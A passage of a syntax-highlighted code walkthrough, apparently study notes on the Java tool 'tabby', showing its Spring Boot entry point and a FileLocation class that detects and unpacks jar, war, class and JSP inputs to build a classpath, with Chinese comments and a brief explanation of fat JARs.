function">getRealPath</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">App</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 设置日志级别，以便打印所有日志消息</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setLogDebugLevel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">LoggerContext</span> loggerContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LoggerContext</span><span class="token punctuation">)</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getILoggerFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">DEBUG</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            loggerContext<span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token string">"tabby"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setLevel</span><span class="token punctuation">(</span><span class="token class-name">Level</span><span class="token punctuation">.</span><span class="token constant">DEBUG</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// @Bean 方法，用于声明一个 CommandLineRunner 对象</span>    <span class="token comment">// 在应用程序启动后执行以下任务：  </span>    <span class="token comment">//      初始化全局配置 </span>    <span class="token comment">//      设置日志级别 </span>    <span class="token comment">//      运行 Analyser 实例 </span>    <span class="token comment">//      输出日志消息**</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token class-name">CommandLineRunner</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> args <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span><span class="token punctuation">&#123;</span>                <span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token function">initConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setLogDebugLevel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                analyser<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", Please check your settings.properties file."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Done. Bye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3id="tabbycoredatafilelocation.java">tabby/core/data/FileLocation.java</h3><ol type="1"><li><p>a <strong>fat JAR</strong> (also known as an<strong>uber-JAR</strong> or <strong>JAR with dependencies</strong>) isa single JAR file that contains <strong>not only</strong> the compiledJava classes from your project <strong>but also</strong> all compiledJava classes from all JAR files your project depends on. This means thatyou can run your Java application <strong>without</strong> having toinstall any additional JAR files on the system where you want to runit.</p></li><li><p>Explain</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>data</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Data</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span></span><span class="token class-name">RandomStringUtils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">GlobalConfiguration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">FileUtils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">JspUtils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Path</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span><span class="token comment">/** * @author wh1t3p1g * @since 2022/12/18 */</span><span class="token annotation punctuation">@Data</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FileLocation</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> cps <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> isJar <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> isFatJar <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> isWar <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> isClass <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> isJsp <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> isDir <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Path</span> path<span class="token punctuation">;</span>    <span class="token comment">// 根据文件路径的信息，设置FileLocation对象的各种属性</span>    <span class="token keyword">public</span> <span class="token class-name">FileLocation</span><span class="token punctuation">(</span><span class="token class-name">Path</span> path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>path <span class="token operator">=</span> path<span class="token punctuation">;</span>        isDir <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">isDirectory</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>isDir<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> filepath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>filepath<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".jsp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                isJsp <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>filepath<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                isClass <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>filepath<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".jar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                isFatJar <span class="token operator">=</span> <span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">IS_CHECK_FAT_JAR</span>                            <span class="token operator">&amp;&amp;</span> <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">isFatJar</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>isFatJar<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    isJar <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>filepath<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".war"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                isWar <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> path<span class="token punctuation">.</span><span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 解析文件路径，并根据文件的类型执行不同的操作，例如解压文件，复制文件，解析JSP文件等。</span>    <span class="token keyword">public</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Path</span> targetPath <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>isWar <span class="token operator">||</span> isFatJar<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// unpack</span>            <span class="token keyword">try</span><span class="token punctuation">&#123;</span>                targetPath <span class="token operator">=</span> <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>isDir<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            targetPath <span class="token operator">=</span> path<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>targetPath <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            cps<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">try</span><span class="token punctuation">&#123;</span>                <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Set</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span><span class="token punctuation">></span></span> targets <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                targets<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"jar"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                targets<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"war"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                targets<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"classes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                targets<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"jsp"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                targets<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"jmods"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">findAllTargets</span><span class="token punctuation">(</span>targetPath<span class="token punctuation">,</span> targets<span class="token punctuation">)</span><span class="token punctuation">;</span>                cps<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>targets<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"jmods"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// jdk >= 9 直接添加</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>isDir<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token comment">// 对于目录类型，可能是最初的输入</span>                    <span class="token comment">// 需要对当前目录的jar和war做处理</span>                    <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> allUnpackedFiles <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    allUnpackedFiles<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>targets<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"war"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    allUnpackedFiles<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>targets<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"jar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> unpacked<span class="token operator">:</span>allUnpackedFiles<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token class-name">FileLocation</span> location <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileLocation</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>unpacked<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        cps<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span> <span class="token comment">// 一般不太可能 war里面嵌套一个war，所以这里暂时不考虑war</span>                    cps<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>targets<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"jar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token comment">// 处理class和jsp</span>                <span class="token class-name">Path</span> tempPath <span class="token operator">=</span> targetPath<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>isDir<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    tempPath <span class="token operator">=</span> <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">registerTempDirectory</span><span class="token punctuation">(</span><span class="token class-name">RandomStringUtils</span><span class="token punctuation">.</span><span class="token function">randomAlphanumeric</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> remainedClasses <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> allClasses <span class="token operator">=</span> targets<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"classes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> cls<span class="token operator">:</span>allClasses<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"BOOT-INF/classes/"</span><span class="token punctuation">)</span> <span class="token operator">||</span> cls<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"WEB-INF/classes/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>                    remainedClasses<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>remainedClasses<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token class-name">Path</span> tmpClassesPath <span class="token operator">=</span> tempPath<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">"classes_"</span><span class="token operator">+</span><span class="token class-name">RandomStringUtils</span><span class="token punctuation">.</span><span class="token function">randomAlphanumeric</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">copyAll</span><span class="token punctuation">(</span>remainedClasses<span class="token punctuation">,</span> tmpClassesPath<span class="token punctuation">,</span> targetPath<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cps<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>tmpClassesPath<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token comment">// jsp</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>targets<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"jsp"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token class-name">Path</span> tmpJspPath <span class="token operator">=</span> tempPath<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">"jsp_"</span><span class="token operator">+</span><span class="token class-name">RandomStringUtils</span><span class="token punctuation">.</span><span class="token function">randomAlphanumeric</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">copyAll</span><span class="token punctuation">(</span>targets<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"jsp"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tmpJspPath<span class="token punctuation">,</span> targetPath<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">String</span> allJarClasspath <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>pathSeparator<span class="token punctuation">,</span> targets<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"jar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">String</span> systemClasspath <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"java.class.path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>systemClasspath <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>systemClasspath<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        allJarClasspath <span class="token operator">=</span> systemClasspath <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>pathSeparator <span class="token operator">+</span> allJarClasspath<span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token class-name">String</span> output <span class="token operator">=</span> <span class="token class-name">JspUtils</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>tmpJspPath<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> allJarClasspath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/org/apache/jsp/"</span><span class="token punctuation">;</span>                    cps<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token comment">//   BOOT-INF/classes</span>                <span class="token comment">//   WEB-INF/classes</span>                <span class="token class-name">Path</span> classes <span class="token operator">=</span> targetPath<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">"BOOT-INF/classes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span>classes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    cps<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>classes<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                classes <span class="token operator">=</span> targetPath<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">"WEB-INF/classes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span>classes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    cps<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>classes<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> cps<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3 id="tabbycoredatatabbyrule.java">tabby/core/data/TabbyRule.java</h3><ol type="1"><li><p>Explain</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>data</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Data</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span>builder<span class="token punctuation">.</span></span><span class="token class-name">EqualsBuilder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span>builder<span class="token punctuation">.</span></span><span class="token class-name">HashCodeBuilder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span 